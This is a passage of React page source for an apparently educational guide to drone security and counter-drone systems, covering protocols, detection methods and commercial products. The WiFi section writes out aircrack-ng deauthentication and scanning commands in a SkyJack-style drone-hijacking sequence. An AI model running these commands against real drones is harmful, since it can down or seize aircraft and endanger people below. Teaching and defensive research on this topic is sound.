                    <strong>Why architecture matters for security:</strong> Every component of a drone represents a potential 
                    attack surface. The GPS receiver can be spoofed with fake signals. The radio link can be jammed or hijacked. 
                    The firmware running on the flight controller may have vulnerabilities. Even the physical sensors can 
                    sometimes be fooled. By understanding the complete system architecture, security researchers can identify 
                    where weaknesses might exist and how they might be exploited or defended against.
                  </Typography>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Drone Architecture & Components
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Typical Quadcopter Architecture
════════════════════════════════════════════════════════════

                    ┌─────────────┐
                    │   GPS/GNSS  │ ← L1: 1575.42 MHz
                    │   Antenna   │   L2: 1227.60 MHz
                    └──────┬──────┘
                           │
┌──────────┐    ┌──────────┴──────────┐    ┌──────────┐
│  Motor 1 │────│   Flight Controller  │────│  Motor 2 │
│  (CW)    │    │   (STM32/Pixhawk)    │    │  (CCW)   │
└──────────┘    │                      │    └──────────┘
                │  ┌────────────────┐  │
                │  │   IMU Sensors  │  │
                │  │ Gyro/Accel/Mag │  │
                │  └────────────────┘  │
┌──────────┐    │                      │    ┌──────────┐
│  Motor 3 │────│   ┌────────────┐    │────│  Motor 4 │
│  (CCW)   │    │   │  Battery   │    │    │  (CW)    │
└──────────┘    │   │  3S-6S LiPo│    │    └──────────┘
                └───┴────────────┴────┘
                         │
        ┌────────────────┼────────────────┐
        │                │                │
┌───────┴───────┐ ┌──────┴──────┐ ┌───────┴───────┐
│ 2.4 GHz Radio │ │ 5.8 GHz VTX │ │   Camera      │
│  (Control)    │ │  (Video)    │ │   Gimbal      │
└───────────────┘ └─────────────┘ └───────────────┘

Key Components for Security Analysis:
├── Flight Controller: Main processor, runs PX4/ArduPilot/Betaflight
├── Radio Receiver: 2.4 GHz control link (vulnerable to jamming)
├── Video Transmitter: 5.8 GHz analog or digital link
├── GPS Module: Navigation, geofencing, return-to-home
├── ESCs: Electronic speed controllers for motors
└── Companion Computer: Optional, runs Linux (attack surface)`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Drone Classifications
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <TableContainer component={Paper} sx={{ bgcolor: theme.bgCode }}>
                        <Table size="small">
                          <TableHead>
                            <TableRow>
                              <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Class</TableCell>
                              <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Weight</TableCell>
                              <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Range</TableCell>
                              <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Examples</TableCell>
                            </TableRow>
                          </TableHead>
                          <TableBody>
                            {[
                              { cls: "Nano/Micro", weight: "<250g", range: "<1 km", ex: "Toy drones, DJI Mini" },
                              { cls: "Small", weight: "250g-2kg", range: "1-5 km", ex: "DJI Mavic, Phantom" },
                              { cls: "Medium", weight: "2-25kg", range: "5-50 km", ex: "DJI M300, commercial" },
                              { cls: "Large", weight: "25-150kg", range: "50-200 km", ex: "Industrial, military" },
                              { cls: "Tactical", weight: ">150kg", range: ">200 km", ex: "Predator, Reaper class" },
                            ].map((row, idx) => (
                              <TableRow key={idx}>
                                <TableCell sx={{ color: theme.secondary }}>{row.cls}</TableCell>
                                <TableCell sx={{ color: theme.text }}>{row.weight}</TableCell>
                                <TableCell sx={{ color: theme.accent }}>{row.range}</TableCell>
                                <TableCell sx={{ color: theme.textMuted }}>{row.ex}</TableCell>
                              </TableRow>
                            ))}
                          </TableBody>
                        </Table>
                      </TableContainer>
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Flight Controller Platforms
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Grid container spacing={2}>
                        {[
                          { name: "PX4", desc: "Open-source, research-friendly, MAVLink protocol", type: "Open Source" },
                          { name: "ArduPilot", desc: "Mature open-source, extensive vehicle support", type: "Open Source" },
                          { name: "Betaflight", desc: "FPV racing focused, highly optimized", type: "Open Source" },
                          { name: "DJI", desc: "Proprietary, OcuSync/Lightbridge, encrypted", type: "Proprietary" },
                        ].map((fc, idx) => (
                          <Grid item xs={12} sm={6} key={idx}>
                            <Paper sx={{ p: 2, bgcolor: theme.bgCode }}>
                              <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                                <Typography variant="subtitle2" sx={{ color: theme.primary }}>{fc.name}</Typography>
                                <Chip
                                  label={fc.type}
                                  size="small"
                                  sx={{
                                    bgcolor: fc.type === "Open Source" ? alpha(theme.success, 0.2) : alpha(theme.warning, 0.2),
                                    color: fc.type === "Open Source" ? theme.success : theme.warning,
                                    fontSize: "0.65rem",
                                  }}
                                />
                              </Box>
                              <Typography variant="caption" sx={{ color: theme.textMuted }}>{fc.desc}</Typography>
                            </Paper>
                          </Grid>
                        ))}
                      </Grid>
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Communication Protocols Section */}
              <Box id="protocols" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <WifiIcon /> Communication Protocols
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Drone communication protocols present various attack surfaces for security research. Understanding 
                    these protocols is fundamental to both offensive and defensive drone security work.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>What are drone protocols?</strong> Protocols are the "languages" that drones and their controllers 
                    use to communicate. Just like computers use HTTP to browse the web or SMTP to send email, drones have 
                    their own specialized protocols for exchanging telemetry data (battery level, GPS position, altitude) 
                    and control commands (takeoff, land, fly to waypoint). Some protocols are open-source and well-documented, 
                    making them easier to analyze but also potentially easier to exploit. Others are proprietary and encrypted, 
                    presenting different security characteristics.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>The security implications:</strong> Protocol design choices have enormous security implications. 
                    If a protocol doesn't use encryption, anyone with the right radio equipment can eavesdrop on telemetry 
                    or even inject their own commands. If authentication is weak or nonexistent, an attacker might be able 
                    to take control of a drone mid-flight. Even well-designed protocols may have implementation vulnerabilities—
                    bugs in the code that translate the protocol specification into working software.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>Learning protocol analysis:</strong> As a beginner, start by understanding the basic structure 
                    of protocols like MAVLink, which is open-source and widely documented. Learn to capture and decode 
                    protocol traffic using tools like Wireshark. Once you understand how legitimate communication works, 
                    you can begin to identify potential weaknesses and understand how attacks like command injection or 
                    replay attacks might work. This knowledge is valuable whether you're trying to secure drone systems 
                    or assess their vulnerabilities.
                  </Typography>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        MAVLink Protocol
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                        MAVLink (Micro Air Vehicle Link) is the most common open-source protocol for drone telemetry and control.
                      </Typography>
                      <CodeBlock
                        code={`MAVLink Protocol Overview
════════════════════════════════════════════════════════════

Frame Structure (MAVLink 2.0):
┌──────┬───────┬─────┬──────┬──────┬─────┬─────────┬──────┬────────┐
│ STX  │  LEN  │ INC │ CMP  │ SEQ  │ SYS │   MSG   │ PAY  │  CRC   │
│ 0xFD │ 1byte │ 1b  │  1b  │  1b  │ 1b  │   3b    │ 0-255│  2b    │
└──────┴───────┴─────┴──────┴──────┴─────┴─────────┴──────┴────────┘

Key Message Types:
├── HEARTBEAT (0)      - System alive indicator
├── SYS_STATUS (1)     - Battery, sensors status
├── GPS_RAW_INT (24)   - GPS position data
├── ATTITUDE (30)      - Roll, pitch, yaw
├── COMMAND_LONG (76)  - Commands (arm, takeoff, etc.)
├── MISSION_ITEM (39)  - Waypoint data
└── RC_CHANNELS (65)   - Remote control inputs

Security Vulnerabilities:
┌─────────────────────────────────────────────────────────────┐
│ • No encryption by default (plaintext telemetry)            │
│ • No authentication (any system can send commands)          │
│ • Sequence numbers predictable                              │
│ • CRC is not cryptographic (integrity only, no auth)        │
│ • Command injection possible via RF or network              │
└─────────────────────────────────────────────────────────────┘

# Python MAVLink parsing example:
from pymavlink import mavutil

# Connect to drone telemetry
mav = mavutil.mavlink_connection('udp:127.0.0.1:14550')
mav.wait_heartbeat()
print(f"Connected to system {mav.target_system}")

# Read messages
while True:
    msg = mav.recv_match(blocking=True)
    print(f"{msg.get_type()}: {msg.to_dict()}")`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        DJI Protocols (OcuSync/Lightbridge)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`DJI Communication Stack
════════════════════════════════════════════════════════════

Protocol Evolution:
├── Lightbridge 1.0  - 2.4 GHz, ~1.7 km range, older Phantoms
├── Lightbridge 2.0  - 2.4 GHz, ~5 km range, Inspire series
├── OcuSync 1.0      - 2.4/5.8 GHz, ~7 km, Mavic Pro
├── OcuSync 2.0      - 2.4/5.8 GHz, ~10 km, Mavic 2
├── OcuSync 3.0      - 2.4/5.8 GHz, ~15 km, Mavic 3
└── O3+              - Latest, improved latency/reliability

Frequency Usage:
┌────────────────┬────────────────────────────────────────┐
│ 2.400-2.4835 GHz │ Control link (primary)               │
│ 5.725-5.850 GHz  │ Video/Control (secondary/FCC mode)   │
└────────────────┴────────────────────────────────────────┘

DJI Security Features:
├── AES-256 encryption for control link
├── Frequency hopping spread spectrum (FHSS)
├── Challenge-response authentication
├── Signed firmware updates
└── Hardware security module in newer models

Known Weaknesses (Research):
├── Older firmware versions had vulnerabilities
├── Debug/service modes may be accessible
├── WiFi-based models (Spark, Mini SE) less secure
├── Remote ID broadcasts unencrypted metadata
└── AeroScope protocol has been reverse-engineered`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        WiFi-Based Drone Control
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Alert severity="error" sx={{ mb: 2, bgcolor: alpha(theme.error, 0.1), color: theme.text }}>
                        <Typography variant="body2">
                          <strong>Highly Vulnerable:</strong> WiFi-controlled drones are the easiest targets for attacks.
                        </Typography>
                      </Alert>
                      <CodeBlock
                        code={`WiFi Drone Vulnerabilities
════════════════════════════════════════════════════════════

Common WiFi Drone Attack Vectors:

1. Deauthentication Attack
   ┌─────────────────────────────────────────────────────────┐
   │ Attacker sends deauth frames to disconnect controller   │
   │ Drone may hover, land, or crash depending on failsafe   │
   └─────────────────────────────────────────────────────────┘

   # Using aircrack-ng:
   aireplay-ng -0 0 -a <drone_bssid> wlan0mon

2. Evil Twin Attack
   ┌─────────────────────────────────────────────────────────┐
   │ Create fake AP with same SSID as drone                  │
   │ Drone or controller connects to attacker's AP           │
   └─────────────────────────────────────────────────────────┘

3. Direct Connection (Open AP)
   ┌─────────────────────────────────────────────────────────┐
   │ Many toy drones have no password                        │
   │ Connect directly and send control commands              │
   └─────────────────────────────────────────────────────────┘

Vulnerable Drones (Examples):
├── Parrot AR.Drone (original SkyJack target)
├── Syma X5C and similar toy drones
├── Hubsan WiFi models
├── Cheap Amazon/AliExpress drones
└── Some DJI models in WiFi mode (Spark, Mini SE)

# SkyJack-style attack concept:
# 1. Put WiFi in monitor mode
airmon-ng start wlan0

# 2. Scan for drone APs
airodump-ng wlan0mon | grep -i drone

# 3. Deauth legitimate controller
aireplay-ng -0 5 -a <drone_mac> -c <controller_mac> wlan0mon

# 4. Connect to drone AP
# 5. Send control commands via UDP`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Remote ID Protocol
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                        Remote ID is a regulatory requirement in many countries for drone identification and tracking.
                      </Typography>
                      <CodeBlock
                        code={`Remote ID (Broadcast Remote ID)
════════════════════════════════════════════════════════════

Broadcast Methods:
├── WiFi Beacon (802.11 NAN)
├── WiFi Beacon (Legacy)
└── Bluetooth 4.0/5.0 Legacy Advertising

Message Content:
┌─────────────────────────────────────────────────────────────┐
│ • UAS ID (Serial Number or Session ID)                      │
│ • UA Latitude/Longitude/Altitude                            │
│ • UA Velocity (ground speed, vertical speed)                │
│ • Operator Latitude/Longitude (takeoff point)               │
│ • Timestamp                                                 │
│ • Emergency Status                                          │
└─────────────────────────────────────────────────────────────┘

Security Implications:
├── Broadcasts are unencrypted (by design, for public safety)
├── Anyone with receiver can track drones
├── Operator location revealed (privacy concern)
├── Can be spoofed (no authentication)
└── Useful for C-UAS detection systems

# Receiving Remote ID with ESP32:
# OpenDroneID receiver project available on GitHub

# Using WiFi monitor mode:
# Look for Vendor Specific elements with OUI: FA:0B:BC (ASTM)

# Bluetooth scanning:
sudo hcitool lescan | grep "DroneID"

# Decoding with droneID-spoofer (research tool):
python3 decode_remoteid.py --interface wlan0mon`}
                      />
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Content continues in next part... */}

              {/* Detection Methods Section */}
              <Box id="detection" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <RadarIcon /> Detection Methods
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Effective C-UAS requires multiple detection methods working together. No single sensor can reliably 
                    detect all drones in all conditions, which is why professional systems use "sensor fusion"—combining 
                    data from multiple sources to get a complete picture.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Why is drone detection so challenging?</strong> Drones present unique detection challenges 
                    compared to traditional aircraft. They're small (often smaller than birds), fly low and slow, can 
                    hover in place, and may operate autonomously without emitting control signals. Consumer drones have 
                    a tiny radar cross-section, making them nearly invisible to traditional air defense radar. They can 
                    easily be confused with birds, plastic bags, or other airborne objects. This is why C-UAS systems 
                    must use multiple complementary detection methods.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>The detection hierarchy:</strong> Most detection scenarios follow a pattern: first detect 
                    that something is present (often via RF or radar), then track its movement to predict its path, 
                    then identify what it is (using cameras or signal analysis), and finally decide on a response. 
                    Each stage requires different sensors and capabilities. Early warning systems prioritize range and 
                    sensitivity, while identification systems prioritize resolution and specificity.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>For beginners:</strong> Start by understanding RF detection, which is often the most accessible. 
                    With a software-defined radio (SDR) and some patience, you can learn to recognize drone control signals 
                    in the 2.4 GHz and 5.8 GHz bands. This hands-on experience will give you practical insight into how 
                    drones communicate and how they can be detected. The table below summarizes the main detection methods 
                    and their trade-offs.
                  </Typography>

                  <TableContainer component={Paper} sx={{ bgcolor: theme.bgNested, mb: 3 }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Method</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Range</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Strengths</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Weaknesses</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          { method: "RF Detection", range: "1-10 km", strength: "Identifies control link, direction finding", weak: "Useless for autonomous drones" },
                          { method: "Radar", range: "0.5-5 km", strength: "Works in all weather, tracks trajectory", weak: "Small RCS, clutter, expensive" },
                          { method: "Acoustic", range: "100-500m", strength: "Passive, identifies drone type", weak: "Short range, noise interference" },
                          { method: "Optical/EO", range: "1-3 km", strength: "Visual confirmation, identification", weak: "Weather dependent, day only" },
                          { method: "Thermal/IR", range: "0.5-2 km", strength: "Works at night, sees motors", weak: "Limited range, expensive" },
                        ].map((row, idx) => (
                          <TableRow key={idx}>
                            <TableCell sx={{ color: theme.secondary, fontWeight: 500 }}>{row.method}</TableCell>
                            <TableCell sx={{ color: theme.accent }}>{row.range}</TableCell>
                            <TableCell sx={{ color: theme.text, fontSize: "0.8rem" }}>{row.strength}</TableCell>
                            <TableCell sx={{ color: theme.textMuted, fontSize: "0.8rem" }}>{row.weak}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        RF Detection & Direction Finding
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`RF Detection System Architecture
════════════════════════════════════════════════════════════

Detection Frequencies:
┌────────────────────────────────────────────────────────────┐
│ 2.4 GHz ISM Band    │ Control links, WiFi drones          │
│ 5.8 GHz ISM Band    │ Video transmission, some control    │
│ 433 MHz             │ Long-range RC systems               │
│ 900 MHz             │ Some telemetry links                │
│ 1.2 GHz             │ Analog video (legacy)               │
└────────────────────────────────────────────────────────────┘

Direction Finding Methods:
├── Amplitude comparison (multiple antennas)
├── Phase interferometry (antenna arrays)
├── Doppler DF (rotating antenna)
├── Time Difference of Arrival (TDOA)
└── Watson-Watt method

Basic RF Detection with SDR:
# Using RTL-SDR to scan for drone signals

# Scan 2.4 GHz band
rtl_power -f 2400M:2500M:1M -g 40 -i 1 -e 60 scan.csv

# Look for FHSS patterns (hopping signals)
# DJI typically uses ~40 MHz bandwidth with hopping

# Using GNU Radio for signal analysis
# Flowgraph: RTL-SDR -> FFT -> Waterfall -> Peak Detection

# Signature-based detection:
# 1. Capture known drone signals
# 2. Extract features (bandwidth, hopping pattern, modulation)
# 3. Train classifier (ML/pattern matching)
# 4. Real-time comparison against library

Direction Finding Array:
        Ant1    Ant2    Ant3    Ant4
          │       │       │       │
          ▼       ▼       ▼       ▼
      ┌───┴───────┴───────┴───────┴───┐
      │    Phase Comparison/TDOA       │
      │    Direction Calculation       │
      └───────────────┬───────────────┘
                      │
              Bearing to Drone`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Acoustic Detection
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Acoustic Drone Detection
════════════════════════════════════════════════════════════

Drone Acoustic Signatures:
├── Motor frequency: 100-500 Hz fundamental
├── Propeller blade pass: RPM × blades / 60
│   Example: 5000 RPM × 2 blades = 166 Hz
├── Harmonics: Integer multiples of fundamental
└── Broadband noise: Turbulence, 1-10 kHz

Typical Quadcopter Spectrum:
┌─────────────────────────────────────────────────┐
│     Amplitude                                    │
│       ▲                                          │
│       │    ████                                  │
│       │   ██████                                 │
│       │  ████████  ████                          │
│       │ ██████████████████  ████                 │
│       │████████████████████████████████          │
│       └──────────────────────────────────► Freq  │
│        100  200  400  800  1.6k  3.2k  Hz        │
│        └─┬─┘└─┬─┘                                │
│     Fundamental Harmonics                        │
└─────────────────────────────────────────────────┘

Detection Array (4-microphone example):
           M1
            │
     M4 ────┼──── M2
            │
           M3

TDOA Calculation:
delay = distance / speed_of_sound
angle = arcsin(delay × c / baseline)

# Python acoustic detection example:
import numpy as np
from scipy import signal

def detect_drone_acoustic(audio, sample_rate=44100):
    # Compute spectrogram
    f, t, Sxx = signal.spectrogram(audio, sample_rate)

    # Look for characteristic frequency peaks
    # Drone motor harmonics typically 100-500 Hz
    motor_band = (f > 100) & (f < 500)
    motor_energy = np.mean(Sxx[motor_band, :], axis=0)

    # Detection threshold
    if np.max(motor_energy) > threshold:
        return True, estimate_direction(audio)
    return False, None`}
                      />
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Commercial C-UAS Systems Section */}
              <Box id="commercial-cuas" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <RadarIcon /> Commercial C-UAS Systems
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    The commercial counter-drone market has exploded in recent years, with dozens of companies offering 
                    sophisticated detection and interdiction systems. Understanding these systems—how they work, their 
                    capabilities and limitations—is essential for security professionals evaluating C-UAS solutions or 
                    assessing potential countermeasures against them.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Market overview:</strong> The global counter-drone market is projected to exceed $7 billion 
                    by 2030. Major players include defense contractors like Raytheon, Lockheed Martin, and Northrop 
                    Grumman, as well as specialized startups like DroneShield, Dedrone, and Anduril. Solutions range 
                    from handheld jammers costing a few thousand dollars to integrated base defense systems costing 
                    millions. The right solution depends on the threat level, legal constraints, and operational 
                    environment.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>Evaluation criteria:</strong> When assessing C-UAS systems, consider detection range and 
                    accuracy, false positive rates, supported drone types (not all systems can detect autonomous 
                    drones), interdiction capabilities and legality, integration with existing security infrastructure, 
                    and total cost of ownership including training and maintenance. No single system excels at everything, 
                    which is why many deployments use multiple complementary technologies.
                  </Typography>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        DroneShield (Australia)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                        DroneShield is one of the most recognized names in commercial C-UAS, offering a full spectrum of 
                        detection and defeat solutions used by military, government, and critical infrastructure customers 
                        worldwide.
                      </Typography>
                      <CodeBlock
                        code={`DroneShield Product Portfolio
════════════════════════════════════════════════════════════

DETECTION SYSTEMS:
┌─────────────────────────────────────────────────────────────┐
│ DroneSentry™                                                │
│ ├── Fixed multi-sensor C-UAS system                         │
│ ├── Combines RF, radar, acoustic, and camera sensors        │
│ ├── AI-powered classification and tracking                  │
│ ├── 360° coverage with sector scanning                      │
│ ├── Range: Up to 5 km detection, varies by sensor           │
│ └── Used at airports, stadiums, military bases              │
├─────────────────────────────────────────────────────────────┤
│ RfOne™                                                      │
│ ├── Passive RF detection sensor                             │
│ ├── Detects drone control signals (2.4/5.8 GHz)             │
│ ├── Direction finding capability                            │
│ ├── Protocol library: DJI, Parrot, FPV systems              │
│ ├── Range: 1-5 km depending on conditions                   │
│ └── Can identify drone type and operator location           │
├─────────────────────────────────────────────────────────────┤
│ DroneSentinel™                                              │
│ ├── Portable tactical system                                │
│ ├── Rapid deployment for events                             │
│ └── Battery powered, ruggedized                             │
└─────────────────────────────────────────────────────────────┘

DEFEAT SYSTEMS:
┌─────────────────────────────────────────────────────────────┐
│ DroneGun Tactical™                                          │
│ ├── Handheld directional jammer                             │
│ ├── Jamming bands: 2.4 GHz, 5.8 GHz, GPS L1/L2              │
│ ├── Range: 1-2 km effective                                 │
│ ├── Weight: ~6.5 kg                                         │
│ ├── Effects: RTH, forced landing, or loss of control        │
│ └── Requires government/military authorization              │
├─────────────────────────────────────────────────────────────┤
│ DroneGun MkIII™                                             │
│ ├── Compact version                                         │
│ ├── Pistol-grip form factor                                 │
│ ├── Lighter weight for extended operations                  │
│ └── Similar frequency coverage                              │
├─────────────────────────────────────────────────────────────┤
│ DroneCannon™                                                │
│ ├── Vehicle/fixed mount omnidirectional jammer              │
│ ├── 360° protection bubble                                  │
│ ├── Higher power for base defense                           │
│ └── Integrated with DroneSentry for auto-response           │
└─────────────────────────────────────────────────────────────┘

TECHNICAL SPECIFICATIONS (DroneGun Tactical):
├── Frequency bands: 433 MHz, 915 MHz, 2.4 GHz, 5.8 GHz, GPS
├── Antenna gain: Directional, ~15 dBi
├── Effective range: 1-2 km (varies with target)
├── Battery life: ~2 hours continuous
├── Operating temperature: -20°C to +50°C
└── Certifications: Various military standards`}
                      />
                      <Alert severity="info" sx={{ mt: 2, bgcolor: alpha(theme.info, 0.1), color: theme.text }}>
                        <Typography variant="body2">
                          <strong>Customers:</strong> Used by 70+ countries including US DoD, UK MoD, and numerous 
                          airports and critical infrastructure sites. Deployed at major events including Olympics 
                          and World Cup.
                        </Typography>
                      </Alert>
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Dedrone (USA/Germany)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                        Dedrone specializes in AI-powered drone detection and airspace security, with a strong focus 
                        on enterprise and critical infrastructure protection.
                      </Typography>
                      <CodeBlock
                        code={`Dedrone Platform Overview
════════════════════════════════════════════════════════════

DedroneTracker™ Platform:
┌─────────────────────────────────────────────────────────────┐
│ CORE CAPABILITIES:                                          │
│ ├── Multi-sensor fusion (RF, radar, camera, acoustic)       │
│ ├── Machine learning classification engine                  │
│ ├── Real-time threat assessment                             │
│ ├── Automated alerting and response triggers                │
│ ├── Cloud-based or on-premise deployment                    │
│ └── API integration with security systems                   │
│                                                             │
│ SENSOR OPTIONS:                                             │
│ ├── RF-160: Passive RF detection, direction finding         │
│ ├── RF-360: 360° RF coverage for base stations              │
│ ├── RadarOne: Micro-Doppler radar for small targets         │
│ └── DroneWatch: AI-powered video analytics                  │
│                                                             │
│ DETECTION LIBRARY:                                          │
│ ├── 300+ drone models recognized                            │
│ ├── Protocol database continuously updated                  │
│ ├── Differentiates drones from RC cars, WiFi devices        │
│ └── Identifies specific drone type and sometimes model      │
└─────────────────────────────────────────────────────────────┘

DedroneDefender™ (Mitigation):
├── Smart jamming with frequency targeting
├── Protocol-aware disruption (efficient jamming)
├── Automated response when threats detected
└── Integration with DroneTracker for detect-to-defeat

Key Customers:
├── Frankfurt Airport (Germany)
├── Multiple US Federal agencies
├── Fortune 500 corporate campuses
├── Correctional facilities (anti-smuggling)
├── Major sporting events
└── Military bases worldwide

Technical Features:
├── Detection range: Up to 5 km (sensor dependent)
├── Classification accuracy: >95% (claimed)
├── False positive rate: <1% (claimed)
├── Latency: <1 second detection to alert
└── Scalable from single sensor to nationwide deployment`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Anduril Industries (USA)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                        Anduril, founded by Palmer Luckey (Oculus VR founder), brings Silicon Valley AI and 
                        software capabilities to defense applications including advanced C-UAS systems.
                      </Typography>
                      <CodeBlock
                        code={`Anduril Lattice™ Platform
════════════════════════════════════════════════════════════

SENTRY TOWER™ C-UAS:
┌─────────────────────────────────────────────────────────────┐
│ Multi-Sensor Tower System                                   │
│ ├── Radar: AESA (Active Electronically Scanned Array)       │
│ ├── EO/IR cameras with AI target recognition                │
│ ├── RF sensors for communication detection                  │
│ ├── Acoustic arrays (optional)                              │
│ └── Autonomous tracking and classification                  │
│                                                             │
│ Lattice AI Platform:                                        │
│ ├── Real-time sensor fusion                                 │
│ ├── Machine learning threat classification                  │
│ ├── Predictive trajectory analysis                          │
│ ├── Automated response recommendations                      │
│ └── Common operating picture across all sensors             │
└─────────────────────────────────────────────────────────────┘

ANVIL™ Interceptor Drone:
┌─────────────────────────────────────────────────────────────┐
│ Kinetic Kill Vehicle                                        │
│ ├── Autonomous intercept drone                              │
│ ├── Terminal guidance with AI tracking                      │
│ ├── Physical collision to neutralize target                 │
│ ├── Reusable (parachute recovery if miss)                   │
│ ├── Works against RF-silent/autonomous drones               │
